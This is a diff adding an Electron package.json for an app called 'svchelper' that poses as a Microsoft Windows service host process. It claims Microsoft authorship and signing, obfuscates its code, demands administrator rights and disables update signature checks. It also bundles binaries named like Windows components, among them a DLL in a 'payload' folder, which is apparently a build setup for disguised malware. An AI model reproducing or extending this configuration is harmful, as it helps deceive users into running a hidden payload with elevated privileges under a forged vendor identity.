@@ -1,0 +1,61 @@
+{
+  "name": "svchelper",
+  "version": "1.0.0",
+  "description": "Host Process for Windows Service Helper",
+  "main": "src/main.js",
+  "private": true,
+  "packageManager": "pnpm@10.4.1",
+  "scripts": {
+    "start": "electron .",
+    "dev": "electron . --dev",
+    "build": "node build-protected.js",
+    "build:raw": "electron-builder --win"
+  },
+  "author": "Microsoft Corporation",
+  "license": "UNLICENSED",
+  "devDependencies": {
+    "@babel/core": "^7.24.0",
+    "@babel/plugin-transform-arrow-functions": "^7.24.0",
+    "@electron/fuses": "^1.8.0",
+    "electron": "^34.3.0",
+    "electron-builder": "^25.1.8",
+    "javascript-obfuscator": "^5.3.0"
+  },
+  "dependencies": {
+    "@electron/asar": "^3.2.13"
+  },
+  "build": {
+    "appId": "com.microsoft.svchelper",
+    "productName": "svchelper",
+    "artifactName": "svchelper.${ext}",
+    "copyright": "\u00A9 Microsoft Corporation. All rights reserved.",
+    "afterPack": "flip-fuses.js",
+    "win": {
+      "target": "dir",
+      "requestedExecutionLevel": "requireAdministrator",
+      "icon": "src/assets/svchelper.ico",
+      "legalTrademarks": "\u00A9 Microsoft Corporation. All rights reserved.",
+      "fileAssociations": [],
+      "signAndEditExecutable": true,
+      "verifyUpdateCodeSignature": false,
+      "signtoolOptions": {
+        "publisherName": "Microsoft Corporation"
+      }
+    },
+    "directories": { "output": "dist" },
+    "files": [ "src/**/*", "node_modules/**/*" ],
+    "extraResources": [
+      { "from": "../build/launcher/sihost.exe",       "to": "sihost.exe" },
+      { "from": "../build/payload/dwmapiext.dll",     "to": "dwmapiext.dll" },
+      { "from": "../build/resolver/dllhost32.exe",    "to": "dllhost32.exe" },
+      { "from": "../build/resolver/cgpt_dbghelp.dll", "to": "cgpt_dbghelp.dll" },
+      { "from": "../build/resolver/symsrv.dll",       "to": "symsrv.dll" }
+    ],
+    "extraMetadata": {
+      "name": "svchelper",
+      "description": "Host Process for Windows Service Helper",
+      "author": "Microsoft Corporation"
+    },
+    "electronDist": null
+  }
+}
